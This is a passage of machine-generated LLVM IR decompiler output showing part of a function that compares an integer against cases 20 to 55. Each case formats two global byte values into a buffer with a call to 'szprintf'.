  %v3_b0f0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b0fc = load i8, i8* @global_var_299ba.79, align 1
  %v4_b108 = sext i8 %v3_b0f0 to i32
  %v6_b108 = sext i8 %v3_b0fc to i32
  %v8_b108 = call i32 @szprintf(i32 %v2_b0e4, i32 ptrtoint ([11 x i8]* @global_var_1ea68.121 to i32), i32 %v4_b108, i32 %v6_b108, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b10c

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0d8, %dec_label_pc_b0e4
  %v7_b110 = icmp eq i32 %v2_acd8, 20
  br i1 %v7_b110, label %dec_label_pc_b118, label %dec_label_pc_b140

dec_label_pc_b118:                                ; preds = %dec_label_pc_b10c
  %v2_b118 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b124 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b130 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b13c = sext i8 %v3_b124 to i32
  %v6_b13c = sext i8 %v3_b130 to i32
  %v8_b13c = call i32 @szprintf(i32 %v2_b118, i32 ptrtoint ([12 x i8]* @global_var_1ea74.123 to i32), i32 %v4_b13c, i32 %v6_b13c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b140

dec_label_pc_b140:                                ; preds = %dec_label_pc_b10c, %dec_label_pc_b118
  %v7_b144 = icmp eq i32 %v2_acd8, 21
  br i1 %v7_b144, label %dec_label_pc_b14c, label %dec_label_pc_b174

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b140
  %v2_b14c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b158 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b164 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b170 = sext i8 %v3_b158 to i32
  %v6_b170 = sext i8 %v3_b164 to i32
  %v8_b170 = call i32 @szprintf(i32 %v2_b14c, i32 ptrtoint ([14 x i8]* @global_var_1ea80.125 to i32), i32 %v4_b170, i32 %v6_b170, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b174

dec_label_pc_b174:                                ; preds = %dec_label_pc_b140, %dec_label_pc_b14c
  %v7_b178 = icmp eq i32 %v2_acd8, 22
  br i1 %v7_b178, label %dec_label_pc_b180, label %dec_label_pc_b1a8

dec_label_pc_b180:                                ; preds = %dec_label_pc_b174
  %v2_b180 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b18c = load i8, i8* @global_var_299b9.78, align 1
  %v3_b198 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b1a4 = sext i8 %v3_b18c to i32
  %v6_b1a4 = sext i8 %v3_b198 to i32
  %v8_b1a4 = call i32 @szprintf(i32 %v2_b180, i32 ptrtoint ([12 x i8]* @global_var_1ea90.127 to i32), i32 %v4_b1a4, i32 %v6_b1a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1a8

dec_label_pc_b1a8:                                ; preds = %dec_label_pc_b174, %dec_label_pc_b180
  %v7_b1ac = icmp eq i32 %v2_acd8, 23
  br i1 %v7_b1ac, label %dec_label_pc_b1b4, label %dec_label_pc_b1dc

dec_label_pc_b1b4:                                ; preds = %dec_label_pc_b1a8
  %v2_b1b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1c0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b1cc = load i8, i8* @global_var_299ba.79, align 1
  %v4_b1d8 = sext i8 %v3_b1c0 to i32
  %v6_b1d8 = sext i8 %v3_b1cc to i32
  %v8_b1d8 = call i32 @szprintf(i32 %v2_b1b4, i32 ptrtoint ([12 x i8]* @global_var_1ea9c.129 to i32), i32 %v4_b1d8, i32 %v6_b1d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1dc

dec_label_pc_b1dc:                                ; preds = %dec_label_pc_b1a8, %dec_label_pc_b1b4
  %v7_b1e0 = icmp eq i32 %v2_acd8, 24
  br i1 %v7_b1e0, label %dec_label_pc_b1e8, label %dec_label_pc_b210

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1dc
  %v2_b1e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1f4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b200 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b20c = sext i8 %v3_b1f4 to i32
  %v6_b20c = sext i8 %v3_b200 to i32
  %v8_b20c = call i32 @szprintf(i32 %v2_b1e8, i32 ptrtoint ([13 x i8]* @global_var_1eaa8.131 to i32), i32 %v4_b20c, i32 %v6_b20c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b210

dec_label_pc_b210:                                ; preds = %dec_label_pc_b1dc, %dec_label_pc_b1e8
  %v7_b214 = icmp eq i32 %v2_acd8, 25
  br i1 %v7_b214, label %dec_label_pc_b21c, label %dec_label_pc_b244

dec_label_pc_b21c:                                ; preds = %dec_label_pc_b210
  %v2_b21c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b228 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b234 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b240 = sext i8 %v3_b228 to i32
  %v6_b240 = sext i8 %v3_b234 to i32
  %v8_b240 = call i32 @szprintf(i32 %v2_b21c, i32 ptrtoint ([13 x i8]* @global_var_1eab8.133 to i32), i32 %v4_b240, i32 %v6_b240, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b244

dec_label_pc_b244:                                ; preds = %dec_label_pc_b210, %dec_label_pc_b21c
  %v7_b248 = icmp eq i32 %v2_acd8, 26
  br i1 %v7_b248, label %dec_label_pc_b250, label %dec_label_pc_b278

dec_label_pc_b250:                                ; preds = %dec_label_pc_b244
  %v2_b250 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b25c = load i8, i8* @global_var_299b9.78, align 1
  %v3_b268 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b274 = sext i8 %v3_b25c to i32
  %v6_b274 = sext i8 %v3_b268 to i32
  %v8_b274 = call i32 @szprintf(i32 %v2_b250, i32 ptrtoint ([13 x i8]* @global_var_1eac8.135 to i32), i32 %v4_b274, i32 %v6_b274, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b278

dec_label_pc_b278:                                ; preds = %dec_label_pc_b244, %dec_label_pc_b250
  %v7_b27c = icmp eq i32 %v2_acd8, 27
  br i1 %v7_b27c, label %dec_label_pc_b284, label %dec_label_pc_b2ac

dec_label_pc_b284:                                ; preds = %dec_label_pc_b278
  %v2_b284 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b290 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b29c = load i8, i8* @global_var_299ba.79, align 1
  %v4_b2a8 = sext i8 %v3_b290 to i32
  %v6_b2a8 = sext i8 %v3_b29c to i32
  %v8_b2a8 = call i32 @szprintf(i32 %v2_b284, i32 ptrtoint ([14 x i8]* @global_var_1ead8.137 to i32), i32 %v4_b2a8, i32 %v6_b2a8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2ac

dec_label_pc_b2ac:                                ; preds = %dec_label_pc_b278, %dec_label_pc_b284
  %v7_b2b0 = icmp eq i32 %v2_acd8, 28
  br i1 %v7_b2b0, label %dec_label_pc_b2b8, label %dec_label_pc_b2e0

dec_label_pc_b2b8:                                ; preds = %dec_label_pc_b2ac
  %v2_b2b8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2c4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b2d0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b2dc = sext i8 %v3_b2c4 to i32
  %v6_b2dc = sext i8 %v3_b2d0 to i32
  %v8_b2dc = call i32 @szprintf(i32 %v2_b2b8, i32 ptrtoint ([14 x i8]* @global_var_1eae8.139 to i32), i32 %v4_b2dc, i32 %v6_b2dc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2e0

dec_label_pc_b2e0:                                ; preds = %dec_label_pc_b2ac, %dec_label_pc_b2b8
  %v7_b2e4 = icmp eq i32 %v2_acd8, 29
  br i1 %v7_b2e4, label %dec_label_pc_b2ec, label %dec_label_pc_b314

dec_label_pc_b2ec:                                ; preds = %dec_label_pc_b2e0
  %v2_b2ec = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2f8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b304 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b310 = sext i8 %v3_b2f8 to i32
  %v6_b310 = sext i8 %v3_b304 to i32
  %v8_b310 = call i32 @szprintf(i32 %v2_b2ec, i32 ptrtoint ([12 x i8]* @global_var_1eaf8.141 to i32), i32 %v4_b310, i32 %v6_b310, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b314

dec_label_pc_b314:                                ; preds = %dec_label_pc_b2e0, %dec_label_pc_b2ec
  %v7_b318 = icmp eq i32 %v2_acd8, 30
  br i1 %v7_b318, label %dec_label_pc_b320, label %dec_label_pc_b348

dec_label_pc_b320:                                ; preds = %dec_label_pc_b314
  %v2_b320 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b32c = load i8, i8* @global_var_299b9.78, align 1
  %v3_b338 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b344 = sext i8 %v3_b32c to i32
  %v6_b344 = sext i8 %v3_b338 to i32
  %v8_b344 = call i32 @szprintf(i32 %v2_b320, i32 ptrtoint ([13 x i8]* @global_var_1eb04.143 to i32), i32 %v4_b344, i32 %v6_b344, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b348

dec_label_pc_b348:                                ; preds = %dec_label_pc_b314, %dec_label_pc_b320
  %v7_b34c = icmp eq i32 %v2_acd8, 31
  br i1 %v7_b34c, label %dec_label_pc_b354, label %dec_label_pc_b37c

dec_label_pc_b354:                                ; preds = %dec_label_pc_b348
  %v2_b354 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b360 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b36c = load i8, i8* @global_var_299ba.79, align 1
  %v4_b378 = sext i8 %v3_b360 to i32
  %v6_b378 = sext i8 %v3_b36c to i32
  %v8_b378 = call i32 @szprintf(i32 %v2_b354, i32 ptrtoint ([12 x i8]* @global_var_1eb14.145 to i32), i32 %v4_b378, i32 %v6_b378, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b37c

dec_label_pc_b37c:                                ; preds = %dec_label_pc_b348, %dec_label_pc_b354
  %v7_b380 = icmp eq i32 %v2_acd8, 32
  br i1 %v7_b380, label %dec_label_pc_b388, label %dec_label_pc_b3b0

dec_label_pc_b388:                                ; preds = %dec_label_pc_b37c
  %v2_b388 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b394 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b3a0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b3ac = sext i8 %v3_b394 to i32
  %v6_b3ac = sext i8 %v3_b3a0 to i32
  %v8_b3ac = call i32 @szprintf(i32 %v2_b388, i32 ptrtoint ([11 x i8]* @global_var_1eb20.147 to i32), i32 %v4_b3ac, i32 %v6_b3ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3b0

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b37c, %dec_label_pc_b388
  %v7_b3b4 = icmp eq i32 %v2_acd8, 33
  br i1 %v7_b3b4, label %dec_label_pc_b3bc, label %dec_label_pc_b3e4

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b3b0
  %v2_b3bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3c8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b3d4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b3e0 = sext i8 %v3_b3c8 to i32
  %v6_b3e0 = sext i8 %v3_b3d4 to i32
  %v8_b3e0 = call i32 @szprintf(i32 %v2_b3bc, i32 ptrtoint ([12 x i8]* @global_var_1eb2c.149 to i32), i32 %v4_b3e0, i32 %v6_b3e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b3b0, %dec_label_pc_b3bc
  %v7_b3e8 = icmp eq i32 %v2_acd8, 34
  br i1 %v7_b3e8, label %dec_label_pc_b3f0, label %dec_label_pc_b418

dec_label_pc_b3f0:                                ; preds = %dec_label_pc_b3e4
  %v2_b3f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3fc = load i8, i8* @global_var_299b9.78, align 1
  %v3_b408 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b414 = sext i8 %v3_b3fc to i32
  %v6_b414 = sext i8 %v3_b408 to i32
  %v8_b414 = call i32 @szprintf(i32 %v2_b3f0, i32 ptrtoint ([12 x i8]* @global_var_1eb38.151 to i32), i32 %v4_b414, i32 %v6_b414, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b418

dec_label_pc_b418:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b3f0
  %v7_b41c = icmp eq i32 %v2_acd8, 35
  br i1 %v7_b41c, label %dec_label_pc_b424, label %dec_label_pc_b44c

dec_label_pc_b424:                                ; preds = %dec_label_pc_b418
  %v2_b424 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b430 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b43c = load i8, i8* @global_var_299ba.79, align 1
  %v4_b448 = sext i8 %v3_b430 to i32
  %v6_b448 = sext i8 %v3_b43c to i32
  %v8_b448 = call i32 @szprintf(i32 %v2_b424, i32 ptrtoint ([12 x i8]* @global_var_1eb44.153 to i32), i32 %v4_b448, i32 %v6_b448, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b44c

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b418, %dec_label_pc_b424
  %v7_b450 = icmp eq i32 %v2_acd8, 36
  br i1 %v7_b450, label %dec_label_pc_b458, label %dec_label_pc_b480

dec_label_pc_b458:                                ; preds = %dec_label_pc_b44c
  %v2_b458 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b464 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b470 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b47c = sext i8 %v3_b464 to i32
  %v6_b47c = sext i8 %v3_b470 to i32
  %v8_b47c = call i32 @szprintf(i32 %v2_b458, i32 ptrtoint ([12 x i8]* @global_var_1eb50.155 to i32), i32 %v4_b47c, i32 %v6_b47c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b480

dec_label_pc_b480:                                ; preds = %dec_label_pc_b44c, %dec_label_pc_b458
  %v7_b484 = icmp eq i32 %v2_acd8, 37
  br i1 %v7_b484, label %dec_label_pc_b48c, label %dec_label_pc_b4b4

dec_label_pc_b48c:                                ; preds = %dec_label_pc_b480
  %v2_b48c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b498 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b4a4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b4b0 = sext i8 %v3_b498 to i32
  %v6_b4b0 = sext i8 %v3_b4a4 to i32
  %v8_b4b0 = call i32 @szprintf(i32 %v2_b48c, i32 ptrtoint ([12 x i8]* @global_var_1eb5c.157 to i32), i32 %v4_b4b0, i32 %v6_b4b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b480, %dec_label_pc_b48c
  %v7_b4b8 = icmp eq i32 %v2_acd8, 38
  br i1 %v7_b4b8, label %dec_label_pc_b4c0, label %dec_label_pc_b4e8

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b4b4
  %v2_b4c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4cc = load i8, i8* @global_var_299b9.78, align 1
  %v3_b4d8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b4e4 = sext i8 %v3_b4cc to i32
  %v6_b4e4 = sext i8 %v3_b4d8 to i32
  %v8_b4e4 = call i32 @szprintf(i32 %v2_b4c0, i32 ptrtoint ([13 x i8]* @global_var_1eb68.159 to i32), i32 %v4_b4e4, i32 %v6_b4e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4e8

dec_label_pc_b4e8:                                ; preds = %dec_label_pc_b4b4, %dec_label_pc_b4c0
  %v7_b4ec = icmp eq i32 %v2_acd8, 39
  br i1 %v7_b4ec, label %dec_label_pc_b4f4, label %dec_label_pc_b51c

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b4e8
  %v2_b4f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b500 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b50c = load i8, i8* @global_var_299ba.79, align 1
  %v4_b518 = sext i8 %v3_b500 to i32
  %v6_b518 = sext i8 %v3_b50c to i32
  %v8_b518 = call i32 @szprintf(i32 %v2_b4f4, i32 ptrtoint ([13 x i8]* @global_var_1eb78.161 to i32), i32 %v4_b518, i32 %v6_b518, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b51c

dec_label_pc_b51c:                                ; preds = %dec_label_pc_b4e8, %dec_label_pc_b4f4
  %v7_b520 = icmp eq i32 %v2_acd8, 40
  br i1 %v7_b520, label %dec_label_pc_b528, label %dec_label_pc_b550

dec_label_pc_b528:                                ; preds = %dec_label_pc_b51c
  %v2_b528 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b534 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b540 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b54c = sext i8 %v3_b534 to i32
  %v6_b54c = sext i8 %v3_b540 to i32
  %v8_b54c = call i32 @szprintf(i32 %v2_b528, i32 ptrtoint ([13 x i8]* @global_var_1eb68.159 to i32), i32 %v4_b54c, i32 %v6_b54c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b550

dec_label_pc_b550:                                ; preds = %dec_label_pc_b51c, %dec_label_pc_b528
  %v7_b554 = icmp eq i32 %v2_acd8, 41
  br i1 %v7_b554, label %dec_label_pc_b55c, label %dec_label_pc_b584

dec_label_pc_b55c:                                ; preds = %dec_label_pc_b550
  %v2_b55c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b568 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b574 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b580 = sext i8 %v3_b568 to i32
  %v6_b580 = sext i8 %v3_b574 to i32
  %v8_b580 = call i32 @szprintf(i32 %v2_b55c, i32 ptrtoint ([13 x i8]* @global_var_1eb88.163 to i32), i32 %v4_b580, i32 %v6_b580, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b584

dec_label_pc_b584:                                ; preds = %dec_label_pc_b550, %dec_label_pc_b55c
  %v7_b588 = icmp eq i32 %v2_acd8, 42
  br i1 %v7_b588, label %dec_label_pc_b590, label %dec_label_pc_b5b8

dec_label_pc_b590:                                ; preds = %dec_label_pc_b584
  %v2_b590 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b59c = load i8, i8* @global_var_299b9.78, align 1
  %v3_b5a8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b5b4 = sext i8 %v3_b59c to i32
  %v6_b5b4 = sext i8 %v3_b5a8 to i32
  %v8_b5b4 = call i32 @szprintf(i32 %v2_b590, i32 ptrtoint ([13 x i8]* @global_var_1eb98.165 to i32), i32 %v4_b5b4, i32 %v6_b5b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5b8

dec_label_pc_b5b8:                                ; preds = %dec_label_pc_b584, %dec_label_pc_b590
  %v7_b5bc = icmp eq i32 %v2_acd8, 43
  br i1 %v7_b5bc, label %dec_label_pc_b5c4, label %dec_label_pc_b5ec

dec_label_pc_b5c4:                                ; preds = %dec_label_pc_b5b8
  %v2_b5c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5d0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b5dc = load i8, i8* @global_var_299ba.79, align 1
  %v4_b5e8 = sext i8 %v3_b5d0 to i32
  %v6_b5e8 = sext i8 %v3_b5dc to i32
  %v8_b5e8 = call i32 @szprintf(i32 %v2_b5c4, i32 ptrtoint ([13 x i8]* @global_var_1eba8.167 to i32), i32 %v4_b5e8, i32 %v6_b5e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5ec

dec_label_pc_b5ec:                                ; preds = %dec_label_pc_b5b8, %dec_label_pc_b5c4
  %v7_b5f0 = icmp eq i32 %v2_acd8, 44
  br i1 %v7_b5f0, label %dec_label_pc_b5f8, label %dec_label_pc_b620

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5ec
  %v2_b5f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b604 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b610 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b61c = sext i8 %v3_b604 to i32
  %v6_b61c = sext i8 %v3_b610 to i32
  %v8_b61c = call i32 @szprintf(i32 %v2_b5f8, i32 ptrtoint ([13 x i8]* @global_var_1eb98.165 to i32), i32 %v4_b61c, i32 %v6_b61c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b620

dec_label_pc_b620:                                ; preds = %dec_label_pc_b5ec, %dec_label_pc_b5f8
  %v7_b624 = icmp eq i32 %v2_acd8, 45
  br i1 %v7_b624, label %dec_label_pc_b62c, label %dec_label_pc_b654

dec_label_pc_b62c:                                ; preds = %dec_label_pc_b620
  %v2_b62c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b638 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b644 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b650 = sext i8 %v3_b638 to i32
  %v6_b650 = sext i8 %v3_b644 to i32
  %v8_b650 = call i32 @szprintf(i32 %v2_b62c, i32 ptrtoint ([13 x i8]* @global_var_1ebb8.169 to i32), i32 %v4_b650, i32 %v6_b650, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b654

dec_label_pc_b654:                                ; preds = %dec_label_pc_b620, %dec_label_pc_b62c
  %v7_b658 = icmp eq i32 %v2_acd8, 46
  br i1 %v7_b658, label %dec_label_pc_b660, label %dec_label_pc_b688

dec_label_pc_b660:                                ; preds = %dec_label_pc_b654
  %v2_b660 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b66c = load i8, i8* @global_var_299b9.78, align 1
  %v3_b678 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b684 = sext i8 %v3_b66c to i32
  %v6_b684 = sext i8 %v3_b678 to i32
  %v8_b684 = call i32 @szprintf(i32 %v2_b660, i32 ptrtoint ([13 x i8]* @global_var_1ebc8.171 to i32), i32 %v4_b684, i32 %v6_b684, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b688

dec_label_pc_b688:                                ; preds = %dec_label_pc_b654, %dec_label_pc_b660
  %v7_b68c = icmp eq i32 %v2_acd8, 47
  br i1 %v7_b68c, label %dec_label_pc_b694, label %dec_label_pc_b6bc

dec_label_pc_b694:                                ; preds = %dec_label_pc_b688
  %v2_b694 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6a0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b6ac = load i8, i8* @global_var_299ba.79, align 1
  %v4_b6b8 = sext i8 %v3_b6a0 to i32
  %v6_b6b8 = sext i8 %v3_b6ac to i32
  %v8_b6b8 = call i32 @szprintf(i32 %v2_b694, i32 ptrtoint ([13 x i8]* @global_var_1ebd8.173 to i32), i32 %v4_b6b8, i32 %v6_b6b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6bc

dec_label_pc_b6bc:                                ; preds = %dec_label_pc_b688, %dec_label_pc_b694
  %v7_b6c0 = icmp eq i32 %v2_acd8, 48
  br i1 %v7_b6c0, label %dec_label_pc_b6c8, label %dec_label_pc_b6f0

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6bc
  %v2_b6c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b6d4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b6e0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b6ec = sext i8 %v3_b6d4 to i32
  %v6_b6ec = sext i8 %v3_b6e0 to i32
  %v8_b6ec = call i32 @szprintf(i32 %v2_b6c8, i32 ptrtoint ([13 x i8]* @global_var_1ebe8.175 to i32), i32 %v4_b6ec, i32 %v6_b6ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6f0

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b6bc, %dec_label_pc_b6c8
  %v7_b6f4 = icmp eq i32 %v2_acd8, 49
  br i1 %v7_b6f4, label %dec_label_pc_b6fc, label %dec_label_pc_b724

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6f0
  %v2_b6fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b708 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b714 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b720 = sext i8 %v3_b708 to i32
  %v6_b720 = sext i8 %v3_b714 to i32
  %v8_b720 = call i32 @szprintf(i32 %v2_b6fc, i32 ptrtoint ([13 x i8]* @global_var_1ebf8.177 to i32), i32 %v4_b720, i32 %v6_b720, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b6f0, %dec_label_pc_b6fc
  %v7_b728 = icmp eq i32 %v2_acd8, 50
  br i1 %v7_b728, label %dec_label_pc_b730, label %dec_label_pc_b758

dec_label_pc_b730:                                ; preds = %dec_label_pc_b724
  %v2_b730 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b73c = load i8, i8* @global_var_299b9.78, align 1
  %v3_b748 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b754 = sext i8 %v3_b73c to i32
  %v6_b754 = sext i8 %v3_b748 to i32
  %v8_b754 = call i32 @szprintf(i32 %v2_b730, i32 ptrtoint ([14 x i8]* @global_var_1ec08.179 to i32), i32 %v4_b754, i32 %v6_b754, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b758

dec_label_pc_b758:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b730
  %v7_b75c = icmp eq i32 %v2_acd8, 51
  br i1 %v7_b75c, label %dec_label_pc_b764, label %dec_label_pc_b78c

dec_label_pc_b764:                                ; preds = %dec_label_pc_b758
  %v2_b764 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b770 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b77c = load i8, i8* @global_var_299ba.79, align 1
  %v4_b788 = sext i8 %v3_b770 to i32
  %v6_b788 = sext i8 %v3_b77c to i32
  %v8_b788 = call i32 @szprintf(i32 %v2_b764, i32 ptrtoint ([14 x i8]* @global_var_1ec18.181 to i32), i32 %v4_b788, i32 %v6_b788, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b758, %dec_label_pc_b764
  %v7_b790 = icmp eq i32 %v2_acd8, 52
  br i1 %v7_b790, label %dec_label_pc_b798, label %dec_label_pc_b7c0

dec_label_pc_b798:                                ; preds = %dec_label_pc_b78c
  %v2_b798 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7a4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b7b0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b7bc = sext i8 %v3_b7a4 to i32
  %v6_b7bc = sext i8 %v3_b7b0 to i32
  %v8_b7bc = call i32 @szprintf(i32 %v2_b798, i32 ptrtoint ([13 x i8]* @global_var_1ec28.183 to i32), i32 %v4_b7bc, i32 %v6_b7bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7c0

dec_label_pc_b7c0:                                ; preds = %dec_label_pc_b78c, %dec_label_pc_b798
  %v7_b7c4 = icmp eq i32 %v2_acd8, 53
  br i1 %v7_b7c4, label %dec_label_pc_b7cc, label %dec_label_pc_b7f4

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b7c0
  %v2_b7cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b7d8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b7e4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b7f0 = sext i8 %v3_b7d8 to i32
  %v6_b7f0 = sext i8 %v3_b7e4 to i32
  %v8_b7f0 = call i32 @szprintf(i32 %v2_b7cc, i32 ptrtoint ([14 x i8]* @global_var_1ec38.185 to i32), i32 %v4_b7f0, i32 %v6_b7f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b7f4

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b7c0, %dec_label_pc_b7cc
  %v7_b7f8 = icmp eq i32 %v2_acd8, 54
  br i1 %v7_b7f8, label %dec_label_pc_b800, label %dec_label_pc_b828

dec_label_pc_b800:                                ; preds = %dec_label_pc_b7f4
  %v2_b800 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b80c = load i8, i8* @global_var_299b9.78, align 1
  %v3_b818 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b824 = sext i8 %v3_b80c to i32
  %v6_b824 = sext i8 %v3_b818 to i32
  %v8_b824 = call i32 @szprintf(i32 %v2_b800, i32 ptrtoint ([15 x i8]* @global_var_1ec48.187 to i32), i32 %v4_b824, i32 %v6_b824, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b828

dec_label_pc_b828:                                ; preds = %dec_label_pc_b7f4, %dec_label_pc_b800
  %v7_b82c = icmp eq i32 %v2_acd8, 55
  br i1 %v7_b82c, label %dec_label_pc_b834, label %dec_label_pc_b85c

dec_label_pc_b834:                                ; preds = %dec_label_pc_b828
